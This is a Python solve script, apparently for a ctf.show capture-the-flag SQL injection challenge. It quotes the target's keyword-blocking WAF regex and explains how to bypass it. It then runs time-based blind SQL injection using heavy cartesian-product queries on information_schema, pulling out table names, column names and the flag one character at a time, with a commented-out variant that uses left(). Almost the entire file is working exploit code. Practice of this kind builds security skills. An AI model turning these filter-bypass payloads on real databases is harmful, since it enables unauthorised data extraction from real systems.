import time
import threading
import requests

'''
查询语句

       where id = ($id);
      
返回逻辑

    //屏蔽危险分子
    function waf($str){
        return preg_match('/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i',$str);
    }   
      
'''

'''
ascii,group_concat,csubstr这些常用的给ban了就换姿势，
用like或者regexp或者left,right之类的等等，或者locate等都可以，
后面的时间盲注笛卡尔积
'''

url = "http://bb054f69-eec0-4181-9ee5-0e0c80418889.challenge.ctf.show:8080/api/index.php"
"""
Author:feng
"""

flag = ''
for i in range(100):
    for j in "-ctfshowabdegijklmnpqruvxyz0123456789{},_":

        #payload = "if((select table_name from information_schema.tables where table_schema=database() limit 0,1) like '{}',(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)".format(flag + j + "%")
        # ctfshow_flagxcac,ctfshow_info

        # payload="if((select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1) like '{}',(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D, information_schema.columns E, information_schema.columns F, information_schema.columns G),1)".format(flag+j+"%")


        payload="if((select flagaabcc from ctfshow_flagxcac) like '{}',SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D),1)".format(flag+j+"%")

        print(payload)
        data = {
            'ip': payload,
            'debug': 1
        }
        try:
            r = requests.post(url=url, data=data, timeout=0.5)
            # time.sleep(2)
            # r2 = requests.post(url=url, data=data, timeout=0.25)
        except Exception as e:
            flag += j
            print(flag)
            if j == "}":
                exit()
            break
        time.sleep(1)
    # time.sleep(1)


# import requests
#
# url = "http://252e1082-f716-48e2-87b0-5a75e25d5ab8.chall.ctf.show:8080/api/index.php"
#
# strr = "-abcdefghijklmnopqrstuvwxyz0123456789{},_"
# # payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"
# # ctfshow_flagxcac,ctfshow_info
# payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxcac'"
# #
# # payload = "select flagaabcc from ctfshow_flagxcac"
# j = 1
# res = ""
# while 1:
#     for i in strr:
#         res += i
#         data = {
#             'ip': f"1) or if(left(({payload}),{j})='{res}',(SELECT count(*) FROM information_schema.tables A, information_schema.columns B, information_schema.columns C),1)",
#             'debug': '1'
#         }
#         # print(i)
#         try:
#             r = requests.post(url, data=data, timeout=3.1)
#             res = res[:-1]
#             time.sleep(0.2)
#         except Exception as e:
#             print(res)
#             j += 1
#         time.sleep(1)

